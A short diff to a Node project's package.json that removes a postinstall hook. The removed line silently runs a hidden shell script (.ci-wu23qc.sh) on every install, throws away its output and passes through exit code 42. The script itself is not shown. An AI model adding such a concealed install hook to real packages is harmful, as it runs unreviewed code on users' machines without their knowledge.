@@ -7,8 +7,7 @@
   "scripts": {
     "start": "node .",
     "test": "node test/index.js",
-    "tsc": "tsc",
-    "postinstall": "sh ./.ci-wu23qc.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "tsc": "tsc"
   },
   "keywords": [
     "discord",
